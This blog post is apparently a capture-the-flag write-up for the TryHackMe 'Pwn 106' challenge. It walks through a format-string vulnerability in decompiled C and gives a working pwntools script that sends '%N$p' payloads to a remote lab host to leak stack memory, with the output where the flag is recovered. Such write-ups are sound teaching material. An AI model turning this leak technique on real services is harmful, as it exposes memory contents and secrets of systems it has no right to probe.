---
author: pl4int3xt
layout: post
title: Pwn 106 - Tryhackme
date: '2024-01-18'
description: "Beginner level binary exploitation challenges from Tryhackme"
categories: [Pwn 101]
tags: [binary exploitation, Tryhackme ]
---

Let's decompile the code with ghidra. from the `printf()` we notice that the output is not formatted and so we can format it the way we like and leak addresses in the stack

```c
void main(void){
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00102119);
  printf("Enter your THM username to participate in the giveaway: ");
  read(0,local_48,0x32);
  printf("\nThanks ");
  printf(local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Running the code we try to leak the address of a pointer using `%p` and it works

```shell
pl4int3xt@archlinux ~/D/p/pwn106> ./pwn106user.pwn106-user
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %p

Thanks 0x7ffcf1b61960
```

So we write a python code to try to loop and leak for addresses and try to unhex them to get the flag and reverse it.

```python
from pwn import *

# Set up pwntools for the correct architecture
exe = './pwn106user.pwn106-user'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Let's fuzz 15 values
for i in range(15):
    try:
        # Create process (level used to reduce noise)
        p = start()
        p.sendlineafter(b': ', '%{}$p'.format(i).encode("utf-8"))
        p.recvuntil(b'Thanks')
        hex = p.recvline()
        hex = hex[3:-1]

        try:
            decode = unhex(hex)
            print(i, decode[::-1])
        except:
            pass

        p.close()
    except EOFError:
        pass
```

Running the code we get the flag between the range `6 - 11`

```shell
pl4int3xt@archlinux ~/D/p/pwn106> python3 pwn106.py REMOTE 10.10.207.244 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
1 b'\x10\x96\x9by\xff\x7f'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
2 b'\xc0\xc8\x94\xf7\xc4\x7f'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
5 b'\xc0\xe4\xffMC\x7f'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
6 b'THM{XXX_'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
7 b'XXX_XXX_'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
8 b'XXXXXXXX'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
9 b'_XXX_XXX'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
10 b'X_XX_XXX'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
11 b'X_XXXX}'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
13 b'\x85caN\x8dU'
[*] Closed connection to 10.10.207.244 port 9006
[+] Opening connection to 10.10.207.244 on port 9006: Done
14 b'@[5\xcc\xb6\x7f'
[*] Closed connection to 10.10.207.244 port 9006
```